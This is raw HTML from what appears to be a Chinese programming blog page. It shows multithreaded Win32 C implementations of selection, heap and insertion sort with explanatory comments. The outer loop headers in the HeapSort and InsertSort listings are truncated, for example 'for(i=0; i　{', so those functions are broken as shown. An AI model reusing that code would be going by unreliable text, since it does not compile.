id=\"crayon-5a6f3a4d88b81274073408-4\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-5\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lMin</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lSwap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-6\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iMinPos</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-7\">　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-8\">　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-9\">　　<span class=\"crayon-v\">lMin</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-10\">　　<span class=\"crayon-v\">iMinPos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-11\">　　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//从无序的元素中找出最小的元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-12\">　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-13\">　　　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lMin</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-14\">　　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-15\">　　　　<span class=\"crayon-v\">iMinPos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-16\">　　　　<span class=\"crayon-v\">lMin</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-17\">　　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-18\">　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-19\">　　<span class=\"crayon-c\">//把选出的元素交换拼接到有序序列的最后</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-20\">　　<span class=\"crayon-v\">lSwap</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-21\">　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iMinPos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-22\">　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iMinPos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lSwap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-23\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-24\">　<span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Select Sort\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//向控制台打印排序结果</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-25\">　<span class=\"crayon-e\">InterlockedIncrement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//返回前使线程完成数标记加1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-26\">　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//检查是否其他线程都已执行完</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-27\">　<span class=\"crayon-c\">//若都执行完则设置程序结束信号量</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-28\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-29\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0048 seconds] -->\r\n<p>堆排序思想：堆：数据元素从1到N排列成一棵二叉树，而且这棵树的每一个子树的根都是该树中的元素的最小或最大的元素这样如果一个无序数据集合是一个堆那么，根元素就是最小或最大的元素堆排序就是不断对剩下的数据建堆，把最小或最大的元素析透出来。下面的算法，就是从最后一个元素开始，依据一个节点比父节点数值大的原则对所有元素进行调整，这样调整一次就形成一个堆，第一个元素就是最小的元素。然后再对剩下的无序数据再进行建堆，注意这时后面的无序数据元素的序数都要改变，如第一次建堆后，第二个元素就会变成堆的第一个元素。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b86824432074\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nunsigned long __stdcall HeapSort(void* theArray)\r\n{\r\n　long* Array = ((MySafeArray*)theArray)-&gt;data;\r\n　int iLength = ((MySafeArray*)theArray)-&gt;iLength;\r\n　int i, j, p;\r\n　long swap;\r\n　for(i=0; i　{\r\n　　for(j = iLength - 1; j&gt;i; j--) //从最后倒数上去比较字节点和父节点\r\n　　{\r\n　　　p = (j - i - 1)/2 + i; //计算父节点数组下标\r\n　　　//注意到树节点序数跟数组下标不是等同的，因为建堆的元素个数逐个递减\r\n　　　if(Array[j] &lt; Array[p]) //如果父节点数值大则交换父节点和字节点\r\n　　　{\r\n　　　　swap = Array[j];\r\n　　　　Array[j] = Array[p];\r\n　　　　Array[p] = swap;\r\n　　　}\r\n　　}\r\n　}\r\n　PrintResult(Array, iLength, \"Heap Sort\"); //向控制台打印排序结果\r\n　InterlockedIncrement(&amp;ThreadCompleted); //返回前使线程完成数标记加1\r\n　if(ThreadCompleted == 4) SetEvent(evtTerminate); //检查是否其他线程都已执行完\r\n　//若都执行完则设置程序结束信号量\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b86824432074-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b86824432074-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-1\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">HeapSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-3\">　<span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-4\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-5\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-6\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">swap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-7\">　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">i</span>　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-8\">　　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//从最后倒数上去比较字节点和父节点</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-9\">　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-10\">　　　<span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//计算父节点数组下标</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-11\">　　　<span class=\"crayon-c\">//注意到树节点序数跟数组下标不是等同的，因为建堆的元素个数逐个递减</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-12\">　　　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//如果父节点数值大则交换父节点和字节点</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-13\">　　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-14\">　　　　<span class=\"crayon-v\">swap</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-15\">　　　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-16\">　　　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">swap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-17\">　　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-18\">　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-19\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-20\">　<span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Heap Sort\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//向控制台打印排序结果</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-21\">　<span class=\"crayon-e\">InterlockedIncrement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//返回前使线程完成数标记加1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-22\">　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//检查是否其他线程都已执行完</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-23\">　<span class=\"crayon-c\">//若都执行完则设置程序结束信号量</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b86824432074-24\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b86824432074-25\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0047 seconds] -->\r\n<p>插入排序思想：把源数据序列看成两半，前面一半是有序的，后面一半是无序的，把无序的数据从头到尾逐个逐个的插入到前面的有序数据中，使得有序的数据的个数不断增大，同时无序的数据个数就越来越少，最后所有元素都会变得有序。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b8a584225918\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nunsigned long __stdcall InsertSort(void* theArray)\r\n{\r\n　long* Array = ((MySafeArray*)theArray)-&gt;data;\r\n　int iLength = ((MySafeArray*)theArray)-&gt;iLength;\r\n　int i=1, j=0;\r\n　long temp;\r\n　for(i=1; i　{\r\n　　temp = Array[i]; //取出序列后面无序数据的第一个元素值\r\n　　for(j=i; j&gt;0; j--) //和前面的有序数据逐个进行比较找出合适的插入位置\r\n　　{\r\n　　　if(Array[j - 1] &gt;temp) //如果该元素比插入值大则后移\r\n　　　　Array[j] = Array[j - 1];\r\n　　　else //如果该元素比插入值小，那么该位置的后一位就是插入元素的位置\r\n　　　　break; \r\n　　}\r\n　　Array[j] = temp;\r\n　}\r\n　PrintResult(Array, iLength, \"Insert Sort\"); //向控制台打印排序结果\r\n　InterlockedIncrement(&amp;ThreadCompleted); //返回前使线程完成数标记加1\r\n　if(ThreadCompleted == 4) SetEvent(evtTerminate); //检查是否其他线程都已执行完\r\n　　//若都执行完则设置程序结束信号量\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-11\">11</div><div 